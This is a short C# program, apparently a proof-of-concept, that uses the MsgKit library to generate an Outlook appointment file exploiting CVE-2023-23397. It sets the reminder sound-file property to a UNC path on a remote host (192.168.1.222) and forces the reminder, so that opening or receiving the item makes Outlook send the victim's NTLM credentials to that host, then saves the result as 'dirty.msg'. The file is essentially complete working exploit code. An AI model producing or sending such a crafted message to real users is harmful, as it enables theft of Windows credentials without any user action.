using MsgKit.Enums;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MsgKit
{
    class Program
    {
        static void Main(string[] args)
        {
            using (var appointment = new Appointment(
            new Sender("moneertv@gmail.com", "moneertv"),
            new Representing("moneertv@gmail.com", "moneertv"),
            "CVE-2023-23397"))
            {
                appointment.Recipients.AddTo("moneer-1998@hotmail.com", "muneer aqraa");
                appointment.Subject = "CVE-2023-23397";
                appointment.Location = "Neverland";
                appointment.MeetingStart = DateTime.Now.Date.AddDays(2).Date;
                appointment.MeetingEnd = DateTime.Now.Date.AddDays(3).Date;
                appointment.AllDay = true;
                appointment.BodyText = "CVE-2023-23397";
                appointment.BodyHtml = "<html><head></head><body><b>testing CVE-2023-23397</b></body></html>";
                appointment.SentOn = DateTime.UtcNow;
                appointment.Importance = MessageImportance.IMPORTANCE_NORMAL;
                appointment.IconIndex = MessageIconIndex.UnsentMail;

                appointment.PidLidReminderFileParameter = @"\\192.168.1.222\";
                appointment.PidLidReminderOverride = true;

                appointment.Save(@"C:\Users\Moneer\Desktop\exploits\CVE-2023-23397\MsgKit-master\generated email msg\dirty.msg");

            }

        }
    }
}
